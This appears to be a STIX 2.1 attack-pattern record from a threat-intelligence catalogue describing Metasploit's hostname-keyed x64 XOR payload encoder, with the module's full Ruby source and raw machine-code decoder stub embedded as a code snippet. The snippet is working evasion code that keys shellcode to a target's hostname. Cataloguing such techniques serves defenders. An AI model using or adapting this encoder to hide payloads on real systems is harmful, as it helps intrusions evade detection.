{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--93239b14-b3dc-40eb-9e76-4f95b3f978ac",
    "created": "2024-08-14T16:33:19.244186Z",
    "modified": "2024-08-14T16:33:19.24419Z",
    "name": "Hostname-based Context Keyed Payload Encoder",
    "description": "Context-Keyed Payload Encoder based on hostname and x64 XOR encoder.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/x64/xor_context.rb",
            "external_id": "xor_context.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Encoder::Xor\n\n  def initialize\n    super(\n      'Name'             => 'Hostname-based Context Keyed Payload Encoder',\n      'Description'      => 'Context-Keyed Payload Encoder based on hostname and x64 XOR encoder.',\n      'Author'           => [ 'sf' 'oso' ],\n      'Arch'             => ARCH_X64,\n      'License'          => MSF_LICENSE,\n      'Platform'         => 'linux',\n      'Decoder'          =>\n        {\n          'KeySize'      => 8,\n          'KeyPack'      => 'Q',\n          'BlockSize'    => 8,\n        }\n      )\n\n    register_options([ OptString.new('C_HOSTNAME',[ true, \"Context Hostname.\", \"hostname\"])])\n  end\n\n  def obtain_key(buf, badchars, state)\n    # TODO: Currently only first 8 chars are taken as key. We should include the other chars in the key.\n    state.key = datastore['C_HOSTNAME'][0..8].reverse!.unpack('H*')[0].to_i(base=16)\n  end\n\n  def decoder_stub( state )\n    # calculate the (negative) block count . We should check this against state.badchars.\n    block_count = [-( ( (state.buf.length - 1) / state.decoder_key_size) + 1)].pack( \"V\" )\n\n    decoder = \"\"+\n      # get hostname\n      \"\\x6a\\x3f\\x58\" +                  # push 0x3f; pop rax\n      \"\\x48\\x8D\\x3C\\x24\" +              # lea rdi, [rsp]\n      \"\\x0F\\x05\" +                      # syscall ; LINUX - sys_uname\n      \"\\x48\\x8B\\x5F\\x41\" +              # movq rbx, [rdi+0x41]; hostname\n\n      # loop\n      \"\\x48\\x31\\xC9\" +                  # xor rcx, rcx\n      \"\\x48\\x81\\xE9\" + block_count +    # sub ecx, block_count\n      \"\\x48\\x8D\\x05\\xEF\\xFF\\xFF\\xFF\" +  # lea rax, [rip - 0x01]\n      \"\\x48\\x31\\x58\\x1d\" +              # xor [rax+0x1d], rbx\n      \"\\x48\\x2D\\xF8\\xFF\\xFF\\xFF\" +      # sub rax, -8\n      \"\\xE2\\xF4\"                        # loop 0x1B\n    return decoder\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}